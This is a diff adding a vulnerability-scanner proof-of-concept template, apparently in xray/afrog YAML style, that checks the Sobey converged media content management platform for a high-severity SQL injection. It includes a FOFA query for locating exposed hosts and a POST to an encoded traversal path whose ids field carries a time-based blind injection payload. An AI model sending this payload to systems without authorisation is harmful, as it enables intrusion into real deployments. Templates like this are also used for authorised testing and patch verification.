@@ -1,0 +1,20 @@
+id: poc-yaml-sobey-imcmp-tianma-op-sqli
+info:
+  name: 索贝融合媒体内容管理平台 tianma_op SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 索贝融合媒体内容管理平台
+  fofa: body="/Sc-TaskMonitoring/" || header="Sobey"
+variables:
+  t1: random_int(4,9)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /sobey-mchEditor/js/%2e%2e/tianma/op
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: opstatus=up&siteCode=1&token=1&ids=1') OR (SELECT * FROM (SELECT(SLEEP({{.t1}})))x)--+x
+  expression: status_code == 200 && contains(body,"\"data\":") && contains(body,"目录配置")
+    && !contains(body,"<") && duration > t1 && duration < t2
+transport: http
